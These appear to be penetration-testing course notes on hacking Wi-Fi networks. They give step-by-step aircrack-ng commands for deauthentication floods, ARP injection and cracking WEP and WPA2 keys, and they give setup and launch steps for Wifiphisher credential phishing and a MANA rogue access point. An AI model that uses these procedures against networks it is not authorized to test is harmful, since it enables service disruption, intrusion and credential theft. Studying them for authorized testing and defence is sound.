# Module 16 - Hacking Wireless Networks #

## Footprint a Wireless Network ##
To footprint a wireless network, one must identify the BSS (Basic Service Set) or Independent BSS (IBSS) provided by the Access Point (AP). This is done with the help of the wireless network's SSID, which can be used to establish an association with the AP to compromise its security.

### Find Wi-Fi Networks in Range ###
#### NetSurveyor ####
NetSurveyor is an 802.11 network discovery tool that gathers info about nearby wireless APs in real-time and displays it in useful ways. It reports the SSID for each wireless network detected, along with the channel used by the AP servicing that network, signal strength, the BSSID (MAC Address), the encryption used...

It can be found at: `Module 16 Hacking Wireless Networks\Wi-Fi Discovery Tools\`.

#### Other Wi-Fi Discovery Tools ####
* inSSIDer Plus (https://www.metageek.com)
* Wi-Fi Scanner (https://lizardsystems.com)
* Acrylic Wi-Fi Home (https://www.acrylicwifi.com)
* WirelessMon (https://www.passmark.com)
* Ekahau HeatMapper (https://www.ekahau.com)


- - - -

## Perform Wireless Traffic Analysis ##
Wireless traffic analysis helps in determining the appropriate strategy for a successful attack. Wi-Fi protocols are unique at Layer 2, and traffic over the air is not serialized, which makes it easy to sniff and analyze wireless packets.

### Find Wi-Fi Networks and Sniff Wi-Fi Packets ###
#### Wash ####
Wash is a utility that can be used to identify WPS-enabled APs in the target wireless network. It also enables you to check if the AP is in a locked or unlocked state (most WPS-enabled routers automatically lock after five or more unsuccessful login attempts).

`wash -i <interface>`

#### Wireshark ####
Wireshark can be used in monitor mode to capture wireless traffic.


- - - -

## Perform Wireless Attacks ##
There are several different types of Wi-Fi attacks that attackers use to eavesdrop on wireless network connections:

* Fragmentation Attack: When successful, it can obtain 1.500 bytes of PRGA (Pseudo Random Generation Algorithm).
* MAC Spoofing Attack
* Disassociation Attack: The attacker makes the victim unavailable to other wireless devices by destroying the connectivity between the AP and the client.
* Deauthentication Attack: The attacker floods the station with forged deauthentication packets to disconnect users from an AP.
* Man-in-the-Middle Attack
* Wireless AP Poisoning Attack
* Rogue Access Points: Wireless AP that an attacker installs on a network without authorization.
* Evil Twin: A fraudulent wireless AP that pretends to be a legitimate one. 
* Wi-Jacking Attack: Method used to gain access to an enormous number of wireless networks.

(If any errors occur executing these commands, try to execute them many times)

### Find Hidden SSIDs ###
#### Aircrack-ng ####
`airmon-ng start <interface>` - To put the interface in monitor mode. If there are processes that could cause trouble: `airmon-ng check kill` and then start it again 

`airodump-ng <interface>` - To display the nearby APs and clients (stations)

`airodump-ng --bssid <BSSID of the target AP> <interface>` - To capture IV packets from the target AP. A list of connected 'stations' will appear.

`aireplay-ng --deauth <N of deauth packets - Ex. 15> -a <BSSID of the target AP> -c <BSSID of the victim (station)> <interface>` - To send 'De-Auth' packets to a victim

### Cracking a WEP Network ###
#### Wifiphisher ####
Wifiphisher is a Rogue AP framework for conducting red team engagements or Wi-Fi security testing. It can be further used to mount victim-customized web phishing attacks against the connected clients in order to capture credentials or infect the victim stations with malware.

First, install the dependencies: `apt-get install libnl-3-dev libnl-genl-e-dev`, `apt-get install libssl-dev` (or `dpkg --configure -a` before if it doesnt work). Then, the 'Rogue AP' repository can be downloaded: `git clone https://github.com/wifiphisher/roguehostapd`. Or in Windows at: `Module 16 Hacking Wireless Networks\GitHub Tools\`. Followed by installing it with `python setup.py install`. Finally, download Wifiphisher: `git clone https://github.com/wifiphisher/wifiphisher`. Or in Windows at: `Module 16 Hacking Wireless Networks\GitHub Tools\`. Followed by installing it with `python setup.py install`.

`wifiphisher --force-hostapd` - To launch Wifiphisher > Select the target AP and the desired Phishing Scenario > The attack will launch

#### Aircrack-ng #### 
`airmon-ng start <interface>` - To put the interface in monitor mode. If there are processes that could cause trouble: `airmon-ng check kill` and then start it again 

`airodump-ng <interface> --encrypt wep` - To display only the available nearby WEP networks

First, test if the AP is susceptible to injection attacks: `aireplay-ng -9 -e <SSID of the target AP> -a <BSSID of the target AP> <interface>`. If the message 'Injection is working!' appears, then we can continue.

Continued, let's start capturing Initialization Vector (IV) packets from the AV: `airodump-ng --bssid <BSSID of the target AP> -c <Channel of the AP> -w <Output dump filename> <interface>`.

In order for us to be sure that we capture IV packets, let's generate ARP traffic: `aireplay-ng -3 -b <BSSID of the target AP> -h <BSSID of the victim station> <interface>`. Wait until the number of sent ARP packets reached 15.000-20.000.

` aircrack-ng '<.cap file with captured WEP Initiation traffic>' ` - To crack the WEP key with the captured IV traffic

### Cracking a WPA Network ###
#### Fern Wifi Cracker ####
It is a wireless security auditing and attack software program that is able to crack and recover WEP/WPA keys and other network-based attacks on wired or wireless networks.

`fern-wifi-cracker` > Select the interface > 'Scan for Access Points' > 'WPA' > Select the target AP > 'Browse' > Select a 'Password' file with a list of possible passwords > 'Attack'

### Cracking a WPA2 Network ###
#### Aircrack-ng ####
`airmon-ng start <interface>` - To put the interface in monitor mode. If there are processes that could cause trouble: `airmon-ng check kill` and then start it again

`airodump-ng <interface>` - To display the nearby APs and clients (stations)

First, we have to capture packets from the AP: `airodump-ng --bssid <BSSID of the target AP> -c <Channel of the AP> -w <Output dump filename> <interface>`.

Then, we have to generate 'deauth' packets to deauthenticate the victim, therefore, forcing them to try to authenticate again and then capture those authentication messages: `aireplay-ng -0 <N of deauth packets - Ex. 11> -a <BSSID of the AP> -c <BSSID of the victim> <interface>`. When the victim tries to authenticate again, and those messages are captured from the 'airodump' terminal, it will display 'WPA Handshake: <BSSID of the AP>'. Now we have the desired WPA Initation traffic.

``` aircrack-ng -a2 (-b) <BSSID of the AP> -w <Password wordlist file path> '<.cap file with captured WPA Initiation traffic>' ``` - To crack the WPA2 password

#### Other WEP/WPA/WPA2 Cracking Tools ####
* Elcomsoft Wireless Security Auditor (https://www.elcomsoft.com)
* Portable Penetrator (https://www.secpoint.com)
* WepCrackGui (https://sourceforge.net)
* Pyrit (GitHub)
* WepAttack (http://wepattack.sourceforge.net)

### Create a Rogue Access Point ###
#### MANA Toolkit ####
It can be downloaded: `git clone --depth 1 https://github.com/sensepost/mana`. Or in Windows at: `Module 16 Hacking Wireless Networks\GitHub Tools\`. Then, fetch the submodules: `git submodule init` and install them `git clone https://github.com/sensepost/hostapd-mana`, `git clone https://github.com/DanMcInerney/net-creds`, `git clone https://github.com/LeonardoNve/dns2proxy` and `git clone https://github.com/byt3bl33d3r/sslstrip2` > `make`, `make install`.

Open '/etc/mana-toolkit/hostapd-mana.conf' and change the 'interface' to the corresponding one and the desired 'ssid'. Open '/usr/share/mana-toolkit/run-mana/start-nat-simple.sh' and change the 'phy' value to the interface value.

To launch the MANA Rogue AP: `bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`.
